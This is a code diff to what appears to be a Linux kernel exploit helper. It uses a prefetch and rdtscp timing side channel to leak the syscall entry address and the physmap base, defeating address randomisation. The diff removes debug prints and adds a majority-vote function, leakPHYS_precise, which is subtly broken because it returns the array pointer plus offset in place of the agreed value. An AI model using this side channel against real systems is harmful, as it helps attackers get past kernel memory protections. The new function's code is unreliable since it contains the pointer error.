@@ -7,7 +7,6 @@ uint64_t sidechannel(size_t addr) {
     "rdtscp;"
     "mov %0, rax;"
     "mov %1, rdx;"
-    "xor rax, rax;"
     "mfence;"
     "prefetcht0 qword ptr [%4];"
     "prefetcht0 qword ptr [%4];"
@@ -54,6 +53,7 @@ uint64_t leak_syscall_entry(int pti,int boost)
             // syscall(0x68);
             // Arbitrary SYSCALL is fine, I use this to avoid accessing other code
             // It should go into syscall and return quickly
+            // sched_yield();
             syscall(0x144,0x132,0x132); // Makes no diff but a little faster
             uint64_t time = sidechannel(SCAN_START + idx * STEP);
             if(!boost)
@@ -122,10 +122,6 @@ uint64_t leak_phys(void)
                 data[idx] += time;
         }
     }
-    // for(int i = 0 ; i < 0x100; i++)
-    // {
-    //     printf("[x] %p\n",data[i]);
-    // }
     for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
     {
         data[i] /= ITERATIONS;
@@ -133,7 +129,6 @@ uint64_t leak_phys(void)
         {
             min = data[i];
             addr = SCAN_START_PHYS + i * STEP_PHYS;
-            // printf("[X] Cur: %p, Pre: %p, Addr: %p\n",data[i],data[i-1],addr);
         }
     }
 
@@ -163,7 +158,24 @@ uint64_t leak_phys(void)
 }
 size_t leakPHYS(size_t offset){
     size_t val =  leak_phys();
-    printf ("PHYSMAP base %p\n",(void *)val);
-    return val;
+    return val+offset;
 }
 
+size_t _find_duplicate(size_t a, size_t b, size_t c) {
+    if (a == b || a == c)
+        return a;
+    if (b == c)
+        return b;
+    return 0; // all different
+}
+size_t leakPHYS_precise(size_t offset){
+    size_t val[3];
+    for(int i = 0; i < 3 ; i++)
+        val[i] = leak_phys();
+    size_t res = _find_duplicate(val[0],val[1],val[2]);
+    if(res)
+        return val+offset;
+    else
+        return leakPHYS_precise(offset);
+    
+}
